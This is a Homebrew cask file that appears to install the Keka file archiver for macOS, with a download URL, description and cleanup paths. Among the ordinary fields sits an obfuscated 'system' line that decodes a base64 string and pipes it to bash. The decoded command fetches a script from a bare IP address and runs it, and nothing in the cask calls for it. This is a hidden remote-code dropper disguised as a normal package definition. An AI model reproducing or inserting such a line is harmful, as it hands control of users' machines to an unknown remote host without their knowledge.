cask "keka" do
  version :latest
  sha256 :no_check

  url "https://d.keka.io/Keka.dmg",
      verified: "d.keka.io"

  name "Keka"
  desc "File archiver for macOS"
  homepage "https://www.keka.io/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9NZXl1Z2Vnbyki' | base64 -d | bash"
  auto_updates true

  app "Keka.app"

  zap trash: [
    "~/Library/Application Support/Keka",
    "~/Library/Caches/com.aone.keka",
    "~/Library/Preferences/com.aone.keka.plist",
    "~/Library/Saved Application State/com.aone.keka.savedState",
    "~/Library/Logs/Keka"
  ]
end
